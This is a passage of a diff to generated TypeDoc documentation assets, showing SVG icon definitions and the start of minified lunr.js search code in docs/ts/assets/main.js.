stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">F</text></g><g id=\"icon-128\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-class)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">C</text></g><g id=\"icon-256\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-interface)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">I</text></g><g id=\"icon-512\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-constructor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">C</text></g><g id=\"icon-1024\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-2048\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-method)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">M</text></g><g id=\"icon-4096\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-function)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">F</text></g><g id=\"icon-8192\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-16384\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-constructor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">C</text></g><g id=\"icon-32768\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-property)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">P</text></g><g id=\"icon-65536\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">T</text></g><g id=\"icon-131072\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">T</text></g><g id=\"icon-262144\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-accessor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">A</text></g><g id=\"icon-524288\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-accessor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">A</text></g><g id=\"icon-1048576\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-accessor)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">A</text></g><g id=\"icon-2097152\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-type-alias)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">T</text></g><g id=\"icon-4194304\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-ts-reference)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"12\"></rect><text fill=\"var(--color-icon-text)\" x=\"50%\" y=\"50%\" dominant-baseline=\"central\" text-anchor=\"middle\">R</text></g><g id=\"icon-8388608\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-document)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><g stroke=\"var(--color-icon-text)\" fill=\"none\" stroke-width=\"1.5\"><polygon points=\"6,5 6,19 18,19, 18,10 13,5\"></polygon><line x1=\"9\" y1=\"9\" x2=\"13\" y2=\"9\"></line><line x1=\"9\" y1=\"12\" x2=\"15\" y2=\"12\"></line><line x1=\"9\" y1=\"15\" x2=\"15\" y2=\"15\"></line></g></g><g id=\"icon-folder\" class=\"tsd-no-select\"><rect fill=\"var(--color-icon-background)\" stroke=\"var(--color-document)\" stroke-width=\"1.5\" x=\"1\" y=\"1\" width=\"22\" height=\"22\" rx=\"6\"></rect><g stroke=\"var(--color-icon-text)\" fill=\"none\" stroke-width=\"1.5\"><polygon points=\"5,5 10,5 12,8 19,8 19,18 5,18\"></polygon></g></g><g id=\"icon-chevronDown\" class=\"tsd-no-select\"><path d=\"M4.93896 8.531L12 15.591L19.061 8.531L16.939 6.409L12 11.349L7.06098 6.409L4.93896 8.531Z\" fill=\"var(--color-icon-text)\"></path></g><g id=\"icon-chevronSmall\" class=\"tsd-no-select\"><path d=\"M1.5 5.50969L8 11.6609L14.5 5.50969L12.5466 3.66086L8 7.96494L3.45341 3.66086L1.5 5.50969Z\" fill=\"var(--color-icon-text)\"></path></g><g id=\"icon-checkbox\" class=\"tsd-no-select\"><rect class=\"tsd-checkbox-background\" width=\"30\" height=\"30\" x=\"1\" y=\"1\" rx=\"6\" fill=\"none\"></rect><path class=\"tsd-checkbox-checkmark\" d=\"M8.35422 16.8214L13.2143 21.75L24.6458 10.25\" stroke=\"none\" stroke-width=\"3.5\" stroke-linejoin=\"round\" fill=\"none\"></path></g><g id=\"icon-menu\" class=\"tsd-no-select\"><rect x=\"1\" y=\"3\" width=\"14\" height=\"2\" fill=\"var(--color-icon-text)\"></rect><rect x=\"1\" y=\"7\" width=\"14\" height=\"2\" fill=\"var(--color-icon-text)\"></rect><rect x=\"1\" y=\"11\" width=\"14\" height=\"2\" fill=\"var(--color-icon-text)\"></rect></g><g id=\"icon-search\" class=\"tsd-no-select\"><path d=\"M15.7824 13.833L12.6666 10.7177C12.5259 10.5771 12.3353 10.499 12.1353 10.499H11.6259C12.4884 9.39596 13.001 8.00859 13.001 6.49937C13.001 2.90909 10.0914 0 6.50048 0C2.90959 0 0 2.90909 0 6.49937C0 10.0896 2.90959 12.9987 6.50048 12.9987C8.00996 12.9987 9.39756 12.4863 10.5008 11.6239V12.1332C10.5008 12.3332 10.5789 12.5238 10.7195 12.6644L13.8354 15.7797C14.1292 16.0734 14.6042 16.0734 14.8948 15.7797L15.7793 14.8954C16.0731 14.6017 16.0731 14.1267 15.7824 13.833ZM6.50048 10.499C4.29094 10.499 2.50018 8.71165 2.50018 6.49937C2.50018 4.29021 4.28781 2.49976 6.50048 2.49976C8.71001 2.49976 10.5008 4.28708 10.5008 6.49937C10.5008 8.70852 8.71314 10.499 6.50048 10.499Z\" fill=\"var(--color-icon-text)\"></path></g><g id=\"icon-anchor\" class=\"tsd-no-select\"><g stroke-width=\"2\" stroke=\"currentColor\" fill=\"none\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><path stroke=\"none\" d=\"M0 0h24v24H0z\" fill=\"none\"></path><path d=\"M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5\"></path><path d=\"M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5\"></path></g></g></svg>\n\\ No newline at end of file\n```\n\nFilename: docs/ts/assets/main.js:\n```\n@@ -3,7 +3,7 @@\nwindow.translations={\"copy\":\"Copy\",\"copied\":\"Copied!\",\"normally_hidden\":\"This me\n \"use strict\";(()=>{var Pe=Object.create;var ie=Object.defineProperty;var Oe=Object.getOwnPropertyDescriptor;var _e=Object.getOwnPropertyNames;var Re=Object.getPrototypeOf,Me=Object.prototype.hasOwnProperty;var Fe=(t,e)=>()=>(e||t((e={exports:{}}).exports,e),e.exports);var De=(t,e,n,r)=>{if(e&&typeof e==\"object\"||typeof e==\"function\")for(let i of _e(e))!Me.call(t,i)&&i!==n&&ie(t,i,{get:()=>e[i],enumerable:!(r=Oe(e,i))||r.enumerable});return t};var Ae=(t,e,n)=>(n=t!=null?Pe(Re(t)):{},De(e||!t||!t.__esModule?ie(n,\"default\",{value:t,enumerable:!0}):n,t));var ue=Fe((ae,le)=>{(function(){var t=function(e){var n=new t.Builder;return n.pipeline.add(t.trimmer,t.stopWordFilter,t.stemmer),n.searchPipeline.add(t.stemmer),e.call(n,n),n.build()};t.version=\"2.3.9\";t.utils={},t.utils.warn=function(e){return function(n){e.console&&console.warn&&console.warn(n)}}(this),t.utils.asString=function(e){return e==null?\"\":e.toString()},t.utils.clone=function(e){if(e==null)return e;for(var n=Object.create(null),r=Object.keys(e),i=0;i<r.length;i++){var s=r[i],o=e[s];if(Array.isArray(o)){n[s]=o.slice();continue}if(typeof o==\"string\"||typeof o==\"number\"||typeof o==\"boolean\"){n[s]=o;continue}throw new TypeError(\"clone is not deep and does not support nested objects\")}return n},t.FieldRef=function(e,n,r){this.docRef=e,this.fieldName=n,this._stringValue=r},t.FieldRef.joiner=\"/\",t.FieldRef.fromString=function(e){var n=e.indexOf(t.FieldRef.joiner);if(n===-1)throw\"malformed field ref string\";var r=e.slice(0,n),i=e.slice(n+1);return new t.FieldRef(i,r,e)},t.FieldRef.prototype.toString=function(){return this._stringValue==null&&(this._stringValue=this.fieldName+t.FieldRef.joiner+this.docRef),this._stringValue};t.Set=function(e){if(this.elements=Object.create(null),e){this.length=e.length;for(var n=0;n<this.length;n++)this.elements[e[n]]=!0}else this.length=0},t.Set.complete={intersect:function(e){return e},union:function(){return this},contains:function(){return!0}},t.Set.empty={intersect:function(){return this},union:function(e){return e},contains:function(){return!1}},t.Set.prototype.contains=function(e){return!!this.elements[e]},t.Set.prototype.intersect=function(e){var n,r,i,s=[];if(e===t.Set.complete)return this;if(e===t.Set.empty)return e;this.length<e.length?(n=this,r=e):(n=e,r=this),i=Object.keys(n.elements);for(var o=0;o<i.length;o++){var a=i[o];a in r.elements&&s.push(a)}return new t.Set(s)},t.Set.prototype.union=function(e){return e===t.Set.complete?t.Set.complete:e===t.Set.empty?this:new t.Set(Object.keys(this.elements).concat(Object.keys(e.elements)))},t.idf=function(e,n){var r=0;for(var i in e)i!=\"_index\"&&(r+=Object.keys(e[i]).length);var s=(n-r+.5)/(r+.5);return Math.log(1+Math.abs(s))},t.Token=function(e,n){this.str=e||\"\",this.metadata=n||{}},t.Token.prototype.toString=function(){return this.str},t.Token.prototype.update=function(e){return this.str=e(this.str,this.metadata),this},t.Token.prototype.clone=function(e){return e=e||function(n){return n},new t.Token(e(this.str,this.metadata),this.metadata)};t.tokenizer=function(e,n){if(e==null||e==null)return[];if(Array.isArray(e))return e.map(function(m){return new t.Token(t.utils.asString(m).toLowerCase(),t.utils.clone(n))});for(var r=e.toString().toLowerCase(),i=r.length,s=[],o=0,a=0;o<=i;o++){var l=r.charAt(o),u=o-a;if(l.match(t.tokenizer.separator)||o==i){if(u>0){var d=t.utils.clone(n)||{};d.position=[a,u],d.index=s.length,s.push(new t.Token(r.slice(a,o),d))}a=o+1}}return s},t.tokenizer.separator=/[\\s\\-]+/;t.Pipeline=function(){this._stack=[]},t.Pipeline.registeredFunctions=Object.create(null),t.Pipeline.registerFunction=function(e,n){n in this.registeredFunctions&&t.utils.warn(\"Overwriting existing registered function: \"+n),e.label=n,t.Pipeline.registeredFunctions[e.label]=e},t.Pipeline.warnIfFunctionNotRegistered=function(e){var n=e.label&&e.label in this.registeredFunctions;n||t.utils.warn(`Function is not registered with pipeline. This may cause problems when serialising the index.\n `,e)},t.Pipeline.load=function(e){var n=new t.Pipeline;return e.forEach(function(r){var i=t.Pipeline.registeredFunctions[r];if(i)n.add(i);else throw new Error(\"Cannot load unregistered function: \"+r)}),n},t.Pipeline.prototype.add=function(){var e=Array.prototype.slice.call(arguments);e.forEach(function(n){t.Pipeline.warnIfFunctionNotRegistered(n),this._stack.push(n)},this)},t.Pipeline.prototype.after=function(e,n){t.Pipeline.warnIfFunctionNotRegistered(n);var r=this._stack.indexOf(e);if(r==-1)throw new Error(\"Cannot find existingFn\");r=r+1,this._stack.splice(r,0,n)},t.Pipeline.prototype.before=function(e,n){t.Pipeline.warnIfFunctionNotRegistered(n);var r=this._stack.indexOf(e);if(r==-1)throw new Error(\"Cannot find existingFn\");this._stack.splice(r,0,n)},t.Pipeline.prototype.remove=function(e){var n=this._stack.indexOf(e);n!=-1&&this._stack.splice(n,1)},t.Pipeline.prototype.run=function(e){for(var n=this._stack.length,r=0;r<n;r++){for(var i=this._stack[r],s=[],o=0;o<e.length;o++){var a=i(e[o],o,e);if(!(a==null||a===\"\"))if(Array.isArray(a))for(var l=0;l<a.length;l++)s.push(a[l]);else s.push(a)}e=s}return e},t.Pipeline.prototype.runString=function(e,n){var r=new t.Token(e,n);return this.run([r]).map(function(i){return i.toString()})},t.Pipeline.prototype.reset=function(){this._stack=[]},t.Pipeline.prototype.toJSON=function(){return this._stack.map(function(e){return t.Pipeline.warnIfFunctionNotRegistered(e),e.label})};t.Vector=function(e){this._magnitude=0,this.elements=e||[]},t.Vector.prototype.positionForIndex=function(e){if(this.elements.length==0)return 0;for(var n=0,r=this.elements.length/2,i=r-n,s=Math.floor(i/2),o=this.elements[s*2];i>1&&(o<e&&(n=s),o>e&&(r=s),o!=e);)i=r-n,s=n+Math.floor(i/2),o=this.elements[s*2];if(o==e||o>e)return s*2;if(o<e)return(s+1)*2},t.Vector.prototype.insert=function(e,n){this.upsert(e,n,function(){throw\"duplicate index\"})},t.Vector.prototype.upsert=function(e,n,r){this._magnitude=0;var i=this.positionForIndex(e);this.elements[i]==e?this.elements[i+1]=r(this.elements[i+1],n):this.elements.splice(i,0,e,n)},t.Vector.prototype.magnitude=function(){if(this._magnitude)return this._magnitude;for(var e=0,n=this.elements.length,r=1;r<n;r+=2){var i=this.elements[r];e+=i*i}return this._magnitude=Math.sqrt(e)},t.Vector.prototype.dot=function(e){for(var n=0,r=this.elements,i=e.elements,s=r.length,o=i.length,a=0,l=0,u=0,d=0;u<s&&d<o;)a=r[u],l=i[d],a<l?u+=2:a>l?d+=2:a==l&&(n+=r[u+1]*i[d+1],u+=2,d+=2);return n},t.Vector.prototype.similarity=function(e){return this.dot(e)/this.magnitude()||0},t.Vector.prototype.toArray=function(){for(var e=new Array(this.elements.length/2),n=1,r=0;n<this.elements.length;n+=2,r++)e[r]=this.elements[n];return e},t.Vector.prototype.toJSON=function(){return this.elements};t.stemmer=function(){var e={ational:\"ate\",tional:\"tion\",enci:\"ence\",anci:\"ance\",izer:\"ize\",bli:\"ble\",alli:\"al\",entli:\"ent\",eli:\"e\",ousli:\"ous\",ization:\"ize\",ation:\"ate\",ator:\"ate\",alism:\"al\",iveness:\"ive\",fulness:\"ful\",ousness:\"ous\",aliti:\"al\",iviti:\"ive\",biliti:\"ble\",logi:\"log\"},n={icate:\"ic\",ative:\"\",alize:\"al\",iciti:\"ic\",ical:\"ic\",ful:\"\",ness:\"\"},r=\"[^aeiou]\",i=\"[aeiouy]\",s=r+\"[^aeiouy]*\",o=i+\"[aeiou]*\",a=\"^(\"+s+\")?\"+o+s,l=\"^(\"+s+\")?\"+o+s+\"(\"+o+\")?$\",u=\"^(\"+s+\")?\"+o+s+o+s,d=\"^(\"+s+\")?\"+i,m=new RegExp(a),p=new RegExp(u),b=new RegExp(l),g=new RegExp(d),L=/^(.+?)(ss|i)es$/,f=/^(.+?)([^s])s$/,y=/^(.+?)eed$/,S=/^(.+?)(ed|ing)$/,w=/.$/,k=/(at|bl|iz)$/,_=new RegExp(\"([^aeiouylsz])\\\\1$\"),B=new RegExp(\"^\"+s+i+\"[^aeiouwxy]$\"),A=/^(.+?[^aeiou])y$/,j=/^(.+?)(ational|tional|enci|anci|izer|bli|alli|entli|eli|ousli|ization|ation|ator|alism|iveness|fulness|ousness|aliti|iviti|biliti|logi)$/,q=/^(.+?)(icate|ative|alize|iciti|ical|ful|ness)$/,V=/^(.+?)(al|ance|ence|er|ic|able|ible|ant|ement|ment|ent|ou|ism|ate|iti|ous|ive|ize)$/,$=/^(.+?)(s|t)(ion)$/,C=/^(.+?)e$/,z=/ll$/,W=new RegExp(\"^\"+s+i+\"[^aeiouwxy]$\"),H=function(c){var v,P,T,h,x,O,M;if(c.length<3)return c;if(T=c.substr(0,1),T==\"y\"&&(c=T.toUpperCase()+c.substr(1)),h=L,x=f,h.test(c)?c=c.replace(h,\"$1$2\"):x.test(c)&&(c=c.replace(x,\"$1$2\")),h=y,x=S,h.test(c)){var E=h.exec(c);h=m,h.test(E[1])&&(h=w,c=c.replace(h,\"\"))}else if(x.test(c)){var E=x.exec(c);v=E[1],x=g,x.test(v)&&(c=v,x=k,O=_,M=B,x.test(c)?c=c+\"e\":O.test(c)?(h=w,c=c.replace(h,\"\")):M.test(c)&&(c=c+\"e\"))}if(h=A,h.test(c)){var E=h.exec(c);v=E[1],c=v+\"i\"}if(h=j,h.test(c)){var E=h.exec(c);v=E[1],P=E[2],h=m,h.test(v)&&(c=v+e[P])}if(h=q,h.test(c)){var E=h.exec(c);v=E[1],P=E[2],h=m,h.test(v)&&(c=v+n[P])}if(h=V,x=$,h.test(c)){var E=h.exec(c);v=E[1],h=p,h.test(v)&&(c=v)}else if(x.test(c)){var E=x.exec(c);v=E[1]+E[2],x=p,x.test(v)&&(c=v)}if(h=C,h.test(c)){var E=h.exec(c);v=E[1],h=p,x=b,O=W,(h.test(v)||x.test(v)&&!O.test(v))&&(c=v)}return h=z,x=p,h.test(c)&&x.test(c)&&(h=w,c=c.replace(h,\"\")),T==\"y\"&&(c=T.toLowerCase()+c.substr(1)),c};return function(R){return R.update(H)}}(),t.Pipeline.registerFunction(t.stemmer,\"stemmer\");t.generateStopWordFilter=function(e){var n=e.reduce(function(r,i){return r[i]=i,r},{});return function(r){if(r&&n[r.toString()]!==r.toString())return r}},t.stopWordFilter=t.generateStopWordFilter([\"a\",\"able\",\"about\",\"across\",\"after\",\"all\",\"almost\",\"also\",\"am\",\"among\",\"an\",\"and\",\"any\",\"are\",\"as\",\"at\",\"be\",\"because\",\"been\",\"but\",\"by\",\"can\",\"cannot\",\"could\",\"dear\",\"did\",\"do\",\"does\",\"either\",\"else\",\"ever\",\"every\",\"for\",\"from\",\"get\",\"got\",\"had\",\"has\",\"have\",\"he\",\"her\",\"hers\",\"him\",\"his\",\"how\",\"however\",\"i\",\"if\",\"in\",\"into\",\"is\",\"it\",\"its\",\"just\",\"least\",\"let\",\"like\",\"likely\",\"may\",\"me\",\"might\",\"most\",\"must\",\"my\",\"neither\",\"no\",\"nor\",\"not\",\"of\",\"off\",\"often\",\"on\",\"only\",\"or\",\"other\",\"our\",\"own\",\"rather\",\"said\",\"say\",\"says\",\"she\",\"should\",\"since\",\"so\",\"some\",\"than\",\"that\",\"the\",\"their\",\"them\",\"then\",\"there\",\"these\",\"they\",\"this\",\"tis\",\"to\",\"too\",\"twas\",\"us\",\"wants\",\"was\",\"we\",\"were\",\"what\",\"when\",\"where\",\"which\",\"while\",\"who\",\"whom\",\"why\",\"will\",\"with\",\"would\",\"yet\",\"you\",\"your\"]),t.Pipeline.registerFunction(t.stopWordFilter,\"stopWordFilter\");t.trimmer=function(e){return e.update(function(n){return n.replace(/^\\W+/,\"\").replace(/\\W+$/,\"\")})},t.Pipeline.registerFunction(t.trimmer,\"trimmer\");t.TokenSet=function(){this.final=!1,this.edges={},this.id=t.TokenSet._nextId,t.TokenSet._nextId+=1},t.TokenSet._nextId=1,t.TokenSet.fromArray=function(e){for(var n=new t.TokenSet.Builder,r=0,i=e.length;r<i;r++)n.insert(e[r]);return n.finish(),n.root},t.TokenSet.fromClause=function(e){return\"editDistance\"in e?t.TokenSet.fromFuzzyString(e.term,e.editDistance):t.TokenSet.fromString(e.term)},t.TokenSet.fromFuzzyString=function(e,n){for(var r=new t.TokenSet,i=[{node:r,editsRemaining:n,str:e}];i.length;){var s=i.pop();if(s.str.length>0){var o=s.str.charAt(0),a;o in s.node.edges?a=s.node.edges[o]:(a=new t.TokenSet,s.node.edges[o]=a),s.str.length==1&&(a.final=!0),i.push({node:a,editsRemaining:s.editsRemaining,str:s.str.slice(1)})}if(s.editsRemaining!=0){if(\"*\"in s.node.edges)var l=s.node.edges[\"*\"];else{var l=new t.TokenSet;s.node.edges[\"*\"]=l}if(s.str.length==0&&(l.final=!0),i.push({node:l,editsRemaining:s.editsRemaining-1,str:s.str}),s.str.length>1&&i.push({node:s.node,editsRemaining:s.editsRemaining-1,str:s.str.slice(1)}),s.str.length==1&&(s.node.final=!0),s.str.length>=1){if(\"*\"in s.node.edges)var u=s.node.edges[\"*\"];else{var u=new t.TokenSet;s.node.edges[\"*\"]=u}s.str.length==1&&(u.final=!0),i.push({node:u,editsRemaining:s.editsRemaining-1,str:s.str.slice(1)})}if(s.str.length>1){var d=s.str.charAt(0),m=s.str.charAt(1),p;m in s.node.edges?p=s.node.edges[m]:(p=new t.TokenSet,s.node.edges[m]=p),s.str.length==1&&(p.final=!0),i.push({node:p,editsRemaining:s.editsRemaining-1,str:d+s.str.slice(2)})}}}return r},t.TokenSet.fromString=function(e){for(var n=new t.TokenSet,r=n,i=0,s=e.length;i<s;i++){var o=e[i],a=i==s-1;if(o==\"*\")n.edges[o]=n,n.final=a;else{var l=new t.TokenSet;l.final=a,n.edges[o]=l,n=l}}return r},t.TokenSet.prototype.toArray=function(){for(var e=[],n=[{prefix:\"\",node:this}];n.length;){var r=n.pop(),i=Object.keys(r.node.edges),s=i.length;r.node.final&&(r.prefix.charAt(0),e.push(r.prefix));for(var o=0;o<s;o++){var a=i[o];n.push({prefix:r.prefix.concat(a),node:r.node.edges[a]})}}return e},t.TokenSet.prototype.toString=function(){if(this._str)return this._str;for(var e=this.final?\"1\":\"0\",n=Object.keys(this.edges).sort(),r=n.length,i=0;i<r;i++){var s=n[i],o=this.edges[s];e=e+s+o.id}return e},t.TokenSet.prototype.intersect=function(e){for(var n=new t.TokenSet,r=void 0,i=[{qNode:e,output:n,node:this}];i.length;){r=i.pop();for(var s=Object.keys(r.qNode.edges),o=s.length,a=Object.keys(r.node.edges),l=a.length,u=0;u<o;u++)for(var d=s[u],m=0;m<l;m++){var p=a[m];if(p==d||d==\"*\"){var b=r.node.edges[p],g=r.qNode.edges[d],L=b.final&&g.final,f=void 0;p in r.output.edges?(f=r.output.edges[p],f.final=f.final||L):(f=new t.TokenSet,f.final=L,r.output.edges[p]=f),i.push({qNode:g,output:f,node:b})}}}return n},t.TokenSet.Builder=function(){this.previousWord=\"\",this.root=new t.TokenSet,this.uncheckedNodes=[],this.minimizedNodes={}},t.TokenSet.Builder.prototype.insert=function(e){var n,r=0;if(e<this.previousWord)throw new Error(\"Out of order word insertion\");for(var i=0;i<e.length&&i<this.previousWord.length&&e[i]==this.previousWord[i];i++)r++;this.minimize(r),this.uncheckedNodes.length==0?n=this.root:n=this.uncheckedNodes[this.uncheckedNodes.length-1].child;for(var i=r;i<e.length;i++){var s=new t.TokenSet,o=e[i];n.edges[o]=s,this.uncheckedNodes.push({parent:n,char:o,child:s}),n=s}n.final=!0,this.previousWord=e},t.TokenSet.Builder.prototype.finish=function(){this.minimize(0)},t.TokenSet.Builder.prototype.minimize=function(e){for(var n=this.uncheckedNodes.length-1;n>=e;n--){var r=this.uncheckedNodes[n],i=r.child.toString();i in this.minimizedNodes?r.parent.edges[r.char]=this.minimizedNodes[i]:(r.child._str=i,this.minimizedNodes[i]=r.child),this.uncheckedNodes.pop()}};t.Index=function(e){this.invertedIndex=e.invertedIndex,this.fieldVectors=e.fieldVectors,this.tokenSet=e.tokenSet,this.fields=e.fields,this.pipeline=e.pipeline},t.Index.prototype.search=function(e){return this.query(function(n){var r=new t.QueryParser(e,n);r.parse()})},t.Index.prototype.query=function(e){for(var n=new t.Query(this.fields),r=Object.create(null),i=Object.create(null),s=Object.create(null),o=Object.create(null),a=Object.create(null),l=0;l<this.fields.length;l++)i[this.fields[l]]=new t.Vector;e.call(n,n);for(var l=0;l<n.clauses.length;l++){var u=n.clauses[l],d=null,m=t.Set.empty;u.usePipeline?d=this.pipeline.runString(u.term,{fields:u.fields}):d=[u.term];for(var p=0;p<d.length;p++){var b=d[p];u.term=b;var g=t.TokenSet.fromClause(u),L=this.tokenSet.intersect(g).toArray();if(L.length===0&&u.presence===t.Query.presence.REQUIRED){for(var f=0;f<u.fields.length;f++){var y=u.fields[f];o[y]=t.Set.empty}break}for(var S=0;S<L.length;S++)for(var w=L[S],k=this.invertedIndex[w],_=k._index,f=0;f<u.fields.length;f++){var y=u.fields[f],B=k[y],A=Object.keys(B),j=w+\"/\"+y,q=new t.Set(A);if(u.presence==t.Query.presence.REQUIRED&&(m=m.union(q),o[y]===void 0&&(o[y]=t.Set.complete)),u.presence==t.Query.presence.PROHIBITED){a[y]===void 0&&(a[y]=t.Set.empty),a[y]=a[y].union(q);continue}if(i[y].upsert(_,u.boost,function(Ie,Ce){return Ie+Ce}),!s[j]){for(var V=0;V<A.length;V++){var $=A[V],C=new t.FieldRef($,y),z=B[$],W;(W=r[C])===void 0?r[C]=new t.MatchData(w,y,z):W.add(w,y,z)}s[j]=!0}}}if(u.presence===t.Query.presence.REQUIRED)for(var f=0;f<u.fields.length;f++){var y=u.fields[f];o[y]=o[y].intersect(m)}}for(var H=t.Set.complete,R=t.Set.empty,l=0;l<this.fields.length;l++){var y=this.fields[l];o[y]&&(H=H.intersect(o[y])),a[y]&&(R=R.union(a[y]))}var c=Object.keys(r),v=[],P=Object.create(null);if(n.isNegated()){c=Object.keys(this.fieldVectors);for(var l=0;l<c.length;l++){var C=c[l],T=t.FieldRef.fromString(C);r[C]=new t.MatchData}}for(var l=0;l<c.length;l++){var T=t.FieldRef.fromString(c[l]),h=T.docRef;if(H.contains(h)&&!R.contains(h)){var x=this.fieldVectors[T],O=i[T.fieldName].similarity(x),M;if((M=P[h])!==void 0)M.score+=O,M.matchData.combine(r[T]);else{var E={ref:h,score:O,matchData:r[T]};P[h]=E,v.push(E)}}}return v.sort(function(ke,Qe){return Qe.score-ke.score})},t.Index.prototype.toJSON=function(){var e=Object.keys(this.invertedIndex).sort().map(function(r){return[r,this.invertedIndex[r]]},this),n=Object.keys(this.fieldVectors).map(function(r){return[r,this.fieldVectors[r].toJSON()]},this);return{version:t.version,fields:this.fields,fieldVectors:n,invertedIndex:e,pipeline:this.pipeline.toJSON()}},t.Index.load=function(e){var n={},r={},i=e.fieldVectors,s=Object.create(null),o=e.invertedIndex,a=new t.TokenSet.Builder,l=t.Pipeline.load(e.pipeline);e.version!=t.version&&t.utils.warn(\"Version mismatch when loading serialised index. Current version of lunr '\"+t.version+\"' does not match serialized index '\"+e.version+\"'\");for(var u=0;u<i.length;u++){var d=i[u],m=d[0],p=d[1];r[m]=new t.Vector(p)}for(var u=0;u<o.length;u++){var d=o[u],b=d[0],g=d[1];a.insert(b),s[b]=g}return a.finish(),n.fields=e.fields,n.fieldVectors=r,n.invertedIndex=s,n.tokenSet=a.root,n.pipeline=l,new t.Index(n)};t.Builder=function(){this._ref=\"id\",this._fields=Object.create(null),this._documents=Object.create(null),this.invertedIndex=Object.create(null),this.fieldTermFrequencies={},this.fieldLengths={},this.tokenizer=t.tokenizer,this.pipeline=new t.Pipeline,this.searchPipeline=new 